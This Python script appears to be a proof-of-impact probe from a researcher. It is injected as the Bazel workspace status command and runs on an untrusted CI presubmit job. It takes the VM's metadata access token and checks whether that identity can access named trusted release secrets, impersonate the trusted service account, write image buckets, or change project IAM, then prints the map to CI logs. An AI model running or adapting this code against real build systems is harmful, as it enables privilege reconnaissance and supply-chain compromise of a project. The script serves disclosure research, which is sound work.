#!/usr/bin/env python3
"""Read-only IAM permission-test probe for Bazel's untrusted presubmit identity.

Supplement v2 (secrets, service-account impersonation, project-level and GCR permissions).
Installed as scripts/ci/pwnreq_iam_probe2.py and run once per Bazel invocation as the
workspace status command on one Linux presubmit job. It performs ONLY:
  * GET  GCE metadata: service-account email, scopes, access token; project id
  * GET  https://storage.googleapis.com/storage/v1/b/<bucket>/iam/testPermissions
  * POST https://cloudresourcemanager.googleapis.com/v1/projects/<id>:testIamPermissions
  * POST https://secretmanager.googleapis.com/v1/projects/<p>/secrets/<s>:testIamPermissions
  * POST https://iam.googleapis.com/v1/projects/<p>/serviceAccounts/<email>:testIamPermissions
No secret is accessed, no token is minted for another identity, and no object, cache,
action, blob, IAM-policy or repository write is possible through the
transport below (method/host/path allowlist, redirects refused). The access token is
never printed, hashed, or written anywhere; the output is swept for it before printing.
"""

import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

MARKER = "pwnreq-bazel-iam2b-20261115"
METADATA_HOST = "169.254.169.254"

# GCR storage for gcr.io/bazel-public (release images are digest-pinned; included for completeness).
TARGET_BUCKETS = ["artifacts.bazel-public.appspot.com", "us.artifacts.bazel-public.appspot.com"]
CONTROL_BUCKETS = {"bazel-builds": "known_read_only", "bazel-untrusted-build-cache": "known_write"}
MISSING_BUCKET = "pwnreq-iam-control-nonexistent-7f3c9e41b2"
GCS_PERMISSIONS = [
    "storage.buckets.get", "storage.buckets.getIamPolicy", "storage.buckets.setIamPolicy",
    "storage.buckets.update", "storage.objects.create", "storage.objects.delete",
    "storage.objects.get", "storage.objects.list", "storage.objects.update",
]
GCS_WRITE = {"storage.buckets.setIamPolicy", "storage.buckets.update", "storage.objects.create",
             "storage.objects.delete", "storage.objects.update"}

# Trusted release secrets (bazel-public) consumed by bazel-trusted agents and the release deploy job.
TARGET_SECRETS = [("bazel-public", s) for s in (
    "bazel-trusted-buildkite-agent-token", "bazel-trusted-bazelcipy-BuildkiteClient-token",
    "bazel-release-key", "github-trusted-token", "choco-trusted-token")]
# Same-principal controls established by 93d7d1 (37238/37239): access 200 vs 403.
CONTROL_SECRETS = {("bazel-untrusted", "bazel-buildkite-agent-token"): "write_or_access",
                   ("bazel-untrusted", "bazel-testing-buildkite-agent-token"): "no_access"}
MISSING_SECRET = ("bazel-untrusted", "pwnreq-iam-missing-secret-7f3c9e")
SECRET_PERMISSIONS = ["secretmanager.secrets.get", "secretmanager.versions.access",
                      "secretmanager.versions.add", "secretmanager.secrets.setIamPolicy"]
SECRET_SENSITIVE = {"secretmanager.versions.access", "secretmanager.versions.add",
                    "secretmanager.secrets.setIamPolicy"}

TRUSTED_SA = ("bazel-public", "buildkite-trusted@bazel-public.iam.gserviceaccount.com")
SELF_SA = ("bazel-untrusted", "buildkite@bazel-untrusted.iam.gserviceaccount.com")
MISSING_SA = ("bazel-untrusted", "pwnreq-missing-7f3c9e@bazel-untrusted.iam.gserviceaccount.com")
SA_PERMISSIONS = ["iam.serviceAccounts.actAs", "iam.serviceAccounts.get", "iam.serviceAccounts.getAccessToken",
                  "iam.serviceAccounts.getOpenIdToken", "iam.serviceAccounts.implicitDelegation",
                  "iam.serviceAccounts.signBlob", "iam.serviceAccounts.signJwt",
                  "iam.serviceAccountKeys.create"]
SA_SENSITIVE = set(SA_PERMISSIONS) - {"iam.serviceAccounts.get"}

TARGET_PROJECT = "bazel-public"
CONTROL_PROJECT = "bazel-untrusted"
MISSING_PROJECT = "pwnreq-iam-missing-7f3c9e"
PROJECT_PERMISSIONS = [
    "remotebuildexecution.actions.set",            # positive control on bazel-untrusted
    "secretmanager.versions.access", "iam.serviceAccounts.getAccessToken", "iam.serviceAccounts.actAs",
    "iam.serviceAccountKeys.create", "artifactregistry.repositories.uploadArtifacts",
    "storage.objects.create", "compute.instances.setMetadata", "compute.projects.setCommonInstanceMetadata",
    "cloudbuild.builds.create", "resourcemanager.projects.setIamPolicy",
]
PROJECT_SENSITIVE = set(PROJECT_PERMISSIONS)

ALLOWED = [
    ("GET", "http", METADATA_HOST,
     re.compile(r"^/computeMetadata/v1/(instance/service-accounts/default/(email|scopes|token)|project/project-id)$")),
    ("GET", "https", "storage.googleapis.com",
     re.compile(r"^/storage/v1/b/[a-z0-9][a-z0-9._-]{1,220}/iam/testPermissions$")),
    ("POST", "https", "cloudresourcemanager.googleapis.com",
     re.compile(r"^/v1/projects/[a-z][a-z0-9-]{4,61}:testIamPermissions$")),
    ("POST", "https", "secretmanager.googleapis.com",
     re.compile(r"^/v1/projects/[a-z][a-z0-9-]{4,61}/secrets/[A-Za-z0-9_-]{1,255}:testIamPermissions$")),
    ("POST", "https", "iam.googleapis.com",
     re.compile(r"^/v1/projects/[a-z][a-z0-9-]{4,61}/serviceAccounts/[a-z0-9-]{1,63}@[a-z][a-z0-9-]{4,61}\.iam\.gserviceaccount\.com:testIamPermissions$")),
]


class NotAllowed(Exception):
    pass


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):  # refuse every redirect
        return None


def check_allowed(method, url):
    u = urllib.parse.urlsplit(url)
    for m, scheme, host, path_re in ALLOWED:
        if method == m and u.scheme == scheme and u.hostname == host and u.port is None and path_re.match(u.path):
            return
    raise NotAllowed("%s %s://%s%s" % (method, u.scheme, u.hostname, u.path))


def real_transport(method, url, headers, body):
    check_allowed(method, url)
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}), _NoRedirect())
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with opener.open(req, timeout=15) as r:
            return r.status, r.read(65536)
    except urllib.error.HTTPError as e:
        return e.code, e.read(65536)
    except Exception as e:  # network failure is recorded, never treated as "no permission"
        return "exc:" + type(e).__name__, b""


def _json(body):
    try:
        return json.loads(body.decode("utf-8"))
    except Exception:
        return None


def _error_summary(body):
    d = _json(body)
    if isinstance(d, dict) and isinstance(d.get("error"), dict):
        e = d["error"]
        return {"code": e.get("code"), "status": e.get("status"), "message": str(e.get("message", ""))[:300]}
    return {"raw_prefix": body[:200].decode("utf-8", "replace")}


def classify(status, granted, write_set):
    # "write" means a sensitive (write, secret-access, impersonation or IAM) permission was granted.
    if status != 200:
        return "error"            # fail-closed: inconclusive, never "none"
    w = sorted(set(granted) & write_set)
    if w:
        return "write"
    return "read_only" if granted else "none"


def test_bucket(transport, token, bucket):
    q = urllib.parse.urlencode([("permissions", p) for p in GCS_PERMISSIONS])
    url = "https://storage.googleapis.com/storage/v1/b/%s/iam/testPermissions?%s" % (bucket, q)
    headers = {"Authorization": "Bearer " + token} if token else {}
    status, body = transport("GET", url, headers, None)
    d = _json(body) if status == 200 else None
    granted = sorted((d or {}).get("permissions", [])) if isinstance(d, dict) else []
    out = {"method": "storage.buckets.testIamPermissions", "resource": "projects/_/buckets/" + bucket,
           "http_status": status, "granted": granted, "verdict": classify(status, granted, GCS_WRITE)}
    if status == 200:
        out["response_body"] = d
    else:
        out["error"] = _error_summary(body)
    return out


def _post_test(transport, token, url, perms, sensitive, method, resource):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    per = {}
    granted = []
    for perm in perms:  # one call per permission so an invalid name cannot mask others
        status, body = transport("POST", url, headers, json.dumps({"permissions": [perm]}).encode())
        d = _json(body) if status == 200 else None
        g = sorted((d or {}).get("permissions", [])) if isinstance(d, dict) else []
        rec = {"http_status": status, "granted": g}
        if status == 200:
            rec["response_body"] = d
        else:
            rec["error"] = _error_summary(body)
        per[perm] = rec
        granted += g
    statuses = {r["http_status"] for r in per.values()}
    overall = 200 if statuses == {200} else sorted(str(s) for s in statuses)
    return {"method": method, "resource": resource, "per_permission": per, "granted": sorted(set(granted)),
            "verdict": classify(overall, granted, sensitive)}


def test_project(transport, token, project):
    return _post_test(transport, token,
                      "https://cloudresourcemanager.googleapis.com/v1/projects/%s:testIamPermissions" % project,
                      PROJECT_PERMISSIONS, PROJECT_SENSITIVE, "cloudresourcemanager.projects.testIamPermissions",
                      "projects/" + project)


def test_secret(transport, token, project, secret):
    return _post_test(transport, token,
                      "https://secretmanager.googleapis.com/v1/projects/%s/secrets/%s:testIamPermissions" % (project, secret),
                      SECRET_PERMISSIONS, SECRET_SENSITIVE, "secretmanager.secrets.testIamPermissions",
                      "projects/%s/secrets/%s" % (project, secret))


def test_sa(transport, token, project, email):
    return _post_test(transport, token,
                      "https://iam.googleapis.com/v1/projects/%s/serviceAccounts/%s:testIamPermissions" % (project, email),
                      SA_PERMISSIONS, SA_SENSITIVE, "iam.serviceAccounts.testIamPermissions",
                      "projects/%s/serviceAccounts/%s" % (project, email))


def should_run(env):
    return (env.get("BUILDKITE_ORGANIZATION_SLUG") == "bazel"
            and env.get("BUILDKITE_PIPELINE_SLUG") == "bazel-bazel-github-presubmit"
            and env.get("BUILDKITE_LABEL", "").startswith(":ubuntu: Ubuntu 24.04 LTS")
            and env.get("BUILDKITE_PARALLEL_JOB", "") in ("", "0"))


def sweep(text, token):
    bad = ["ya29.", "Bearer ", "access_token", "BEGIN PRIVATE KEY", "bkua_", "bkat_"]
    if token and token in text:
        return False
    return not any(b in text for b in bad)


def run(transport, env):
    report = {"marker": MARKER, "buildkite": {k: env.get(k, "") for k in (
        "BUILDKITE_ORGANIZATION_SLUG", "BUILDKITE_PIPELINE_SLUG", "BUILDKITE_BUILD_NUMBER", "BUILDKITE_JOB_ID",
        "BUILDKITE_LABEL", "BUILDKITE_PARALLEL_JOB", "BUILDKITE_COMMIT", "BUILDKITE_BRANCH",
        "BUILDKITE_PULL_REQUEST", "BUILDKITE_AGENT_NAME")}}
    md = "http://%s/computeMetadata/v1/" % METADATA_HOST
    mh = {"Metadata-Flavor": "Google"}
    s, b = transport("GET", md + "instance/service-accounts/default/email", mh, None)
    report["principal"] = {"status": s, "email": b.decode("utf-8", "replace").strip() if s == 200 else None}
    s, b = transport("GET", md + "project/project-id", mh, None)
    report["vm_project"] = b.decode("utf-8", "replace").strip() if s == 200 else {"status": s}
    s, b = transport("GET", md + "instance/service-accounts/default/scopes", mh, None)
    report["scopes"] = b.decode("utf-8", "replace").split() if s == 200 else {"status": s}
    s, b = transport("GET", md + "instance/service-accounts/default/token", mh, None)
    token = None
    if s == 200:
        d = _json(b) or {}
        token = d.get("access_token") or None
    report["token"] = {"status": s, "obtained": bool(token)}   # no value, no hash
    if token:
        t = {}
        for bk in TARGET_BUCKETS:
            t["gcs:" + bk] = test_bucket(transport, token, bk)
        for proj, sec in TARGET_SECRETS:
            t["secret:%s/%s" % (proj, sec)] = test_secret(transport, token, proj, sec)
        t["sa:" + TRUSTED_SA[1]] = test_sa(transport, token, *TRUSTED_SA)
        t["project:" + TARGET_PROJECT] = test_project(transport, token, TARGET_PROJECT)
        report["targets"] = t
        c = {}
        for bk, exp in CONTROL_BUCKETS.items():
            c["gcs:" + bk] = dict(test_bucket(transport, token, bk), expected=exp)
        c["gcs:" + MISSING_BUCKET] = dict(test_bucket(transport, token, MISSING_BUCKET), expected="error")
        for (proj, sec), exp in CONTROL_SECRETS.items():
            c["secret:%s/%s" % (proj, sec)] = dict(test_secret(transport, token, proj, sec), expected=exp)
        # v2.1: missing-resource controls are observational. v1 showed CRM returns 200 {} for a
        # nonexistent project (existence hiding); Secret Manager/IAM may behave the same way.
        c["secret:%s/%s" % MISSING_SECRET] = dict(test_secret(transport, token, *MISSING_SECRET), expected="observe")
        c["sa:" + SELF_SA[1]] = dict(test_sa(transport, token, *SELF_SA), expected="observe")
        c["sa:" + MISSING_SA[1]] = dict(test_sa(transport, token, *MISSING_SA), expected="observe")
        c["project:" + CONTROL_PROJECT] = dict(test_project(transport, token, CONTROL_PROJECT), expected="answered")
        c["project:" + MISSING_PROJECT] = dict(test_project(transport, token, MISSING_PROJECT), expected="observe")
        report["controls"] = c
        own = c["secret:bazel-untrusted/bazel-buildkite-agent-token"]
        other = c["secret:bazel-untrusted/bazel-testing-buildkite-agent-token"]
        report["controls_pass"] = (
            c["gcs:bazel-builds"]["verdict"] == "read_only"
            and c["gcs:bazel-untrusted-build-cache"]["verdict"] == "write"
            and c["gcs:" + MISSING_BUCKET]["verdict"] == "error"
            and "secretmanager.versions.access" in own["granted"]
            and own["verdict"] in ("write", "read_only")
            and other["verdict"] in ("read_only", "none", "error")
            and "secretmanager.versions.access" not in other["granted"]
            and c["secret:%s/%s" % MISSING_SECRET]["verdict"] in ("error", "none")
            and c["sa:" + MISSING_SA[1]]["verdict"] in ("error", "none")
            and "remotebuildexecution.actions.set" in c["project:" + CONTROL_PROJECT]["granted"]
            and c["project:" + MISSING_PROJECT]["verdict"] in ("error", "none"))
    text = json.dumps(report, sort_keys=True)
    token = None
    return text


def main():
    if not should_run(os.environ):
        print("PWNREQ_IAM2_PROBE skipped")
        return
    text = None
    tok_holder = {}

    def guarded(method, url, headers, body):
        if headers and "Authorization" in headers:
            tok_holder["t"] = headers["Authorization"][len("Bearer "):]
        return real_transport(method, url, headers, body)

    try:
        text = run(guarded, dict(os.environ))
    except Exception as e:
        text = json.dumps({"marker": MARKER, "probe_error": type(e).__name__})
    if not sweep(text, tok_holder.get("t")):
        text = json.dumps({"marker": MARKER, "redaction_failure": True})
    tok_holder.clear()
    print("PWNREQ_IAM2_RESULT " + text, file=sys.stderr)
    print("PWNREQ_IAM2_PROBE done")


if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        print("PWNREQ_IAM2_PROBE error_%s" % type(error).__name__)
